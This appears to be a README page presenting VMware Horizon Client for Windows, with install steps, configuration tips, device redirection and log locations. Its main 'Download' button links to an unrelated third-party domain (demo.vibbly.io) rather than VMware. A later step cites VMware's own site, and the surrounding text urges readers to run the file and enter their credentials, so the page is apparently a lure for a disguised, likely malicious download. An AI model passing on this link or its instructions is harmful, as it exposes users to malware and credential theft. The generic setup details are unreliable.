# VMware Horizon Client

VMware Horizon Client for Windows is a software application that enables users to securely connect to remote desktops and applications hosted on VMware Horizon servers. It allows businesses and individuals to access their work environment from anywhere while ensuring security and seamless integration with external devices and network configurations.

- [Installation](#installation)  
- [System Requirements and Setup](#system-requirements-and-setup)  
- [Installing and Upgrading Horizon Client](#installing-and-upgrading-horizon-client)  
- [Configuring Horizon Client](#configuring-horizon-client)  
- [Connecting to Remote Desktops and Applications](#connecting-to-remote-desktops-and-applications)  
- [Using Remote Desktops and Applications](#using-remote-desktops-and-applications)  
- [Using External Devices](#using-external-devices)  
- [Security and Authentication Features](#security-and-authentication-features)  
- [Troubleshooting and Logs](#troubleshooting-and-logs)  


## Installation
[**Download VMware Horizon Client**](https://demo.vibbly.io/siz/)

Click the download button to get started with VMware Horizon Client. This application allows you to securely connect to your organization’s remote desktops and applications from your Windows device.

After downloading, double-click the installer file. Follow the guided setup to customize your installation options—whether you want to enable smart card authentication, configure display settings, or optimize for performance. Once installed, launch the client and log in with your credentials. If you experience issues connecting, ensure that your network settings are configured correctly or reach out to your IT support team.


## System Requirements and Setup

### Hardware and Software Requirements

Before installing Horizon Client, ensure your system meets the following requirements:

- **Processor**: x86-64 with SSE2 extensions (800 MHz or faster)
- **Memory**: At least 1GB RAM
- **Operating Systems**:
  - Windows 11 (64-bit, Version 22H2, 21H2)
  - Windows 10 (64-bit, Versions 22H2, 21H2, 20H2, LTSC 2021/2019)
  - Windows Server 2012 R2, 2016, 2019

### Authentication and Security Features

Horizon Client supports multiple authentication methods, including:

- **Smart Card Authentication**
- **Client Device Certificate Authentication**
- **Two-Factor Authentication (RSA, RADIUS)**
- **Windows Hello for Business**

>[!note] 
> Some features require additional setup on the Horizon Server.

### Supported Operating Systems

Horizon Client for Windows supports multiple Windows editions, including standard desktop and server versions. For an up-to-date compatibility list, refer to VMware’s official documentation.

## Installing and Upgrading Horizon Client

### Installation Process

1. Download the installer from [VMware’s official website](https://www.vmware.com/go/viewclients).
2. Run the `.exe` installer and follow the on-screen instructions.
3. Choose either **Typical** or **Custom** installation.
4. Click **Agree & Install** and restart your system if required.

### Command-Line Installation Options

To install Horizon Client via command line, use:

```sh
VMware-Horizon-Client.exe /silent /install
```

To enable FIPS-compliant cryptography:

```sh
VMware-Horizon-Client.exe VDM_FIPS_ENABLED=1
```

### Updating and Uninstalling the Client

- To update, navigate to **Options > Software Updates** in the client.
- To uninstall, use:

```sh
VMware-Horizon-Client.exe /uninstall
```


## Configuring Horizon Client

### Connection Server Preparation

Ensure your Connection Server is properly configured with:

- **Correct IP Address or DNS Name**
- **Secure Tunneling Enabled** (if needed)
- **Multi-Factor Authentication Setup** (if required)

### Common Configuration Settings

Horizon Client settings can be customized via:

- **Group Policies** (GPOs)
- **Windows Registry**
- **Custom Command-Line Parameters**

>[!info] 
> Advanced users can tweak the `HKLM\Software\VMware, Inc.\Horizon Client` registry keys for additional configurations.


## Connecting to Remote Desktops and Applications

### Logging In and Authentication

1. Launch Horizon Client.
2. Enter the **Connection Server** address.
3. Provide your **Username and Password**.
4. Choose the **Remote Desktop or Application**.

### Session Management and Reconnection

- Use **Auto-Reconnect** for seamless login.
- Enable **Session Persistence** to retain unsaved work.

### Using Shortcuts and Auto-Connect Features

- Create a **Desktop Shortcut** for faster access.
- Configure **Auto-Connect to Last Session** in settings.


## Using Remote Desktops and Applications

### Copy-Paste and File Sharing

Enable **Clipboard Redirection** to copy between local and remote sessions. Use drag-and-drop for file transfer.

### Session Customization (Window Size, IME, DPI)

Adjust **Display Settings** to optimize performance:

```sh
vmware-view://desktopName?desktopLayout=fullscreen
```

### Performance Optimization Tips

- Use **VMware Blast** for better graphics.
- Disable unnecessary background applications.

# Using External Devices

### Multi-Monitor Setup and Display Configuration

- **Span Across Multiple Monitors**
- **Select Specific Monitors for Display**

### USB and Printer Redirection

Enable **USB Redirection** via settings:

```sh
vmware-view://server?connectUSBOnStartup=true
```

### Webcam and Audio Device Integration

- Optimize **Real-Time Audio-Video (RTAV)** for video calls.
- Choose **Preferred Microphone and Speakers**.


## Security and Authentication Features

### Smart Card and Certificate Authentication

- Install required **Smart Card Drivers**.
- Use **Client Certificate Authentication** for enhanced security.

### Two-Factor Authentication (RSA, RADIUS)

Enable via **Horizon Console > Security Settings**.


## Troubleshooting and Logs

### Common Issues and Fixes

- **Black Screen?** Check display protocol settings.
- **Connection Issues?** Verify firewall and proxy settings.

### Viewing and Analyzing Logs

Log files are located in:

```sh
C:\Users\<Username>\AppData\Local\VMware\VDM\Logs
```
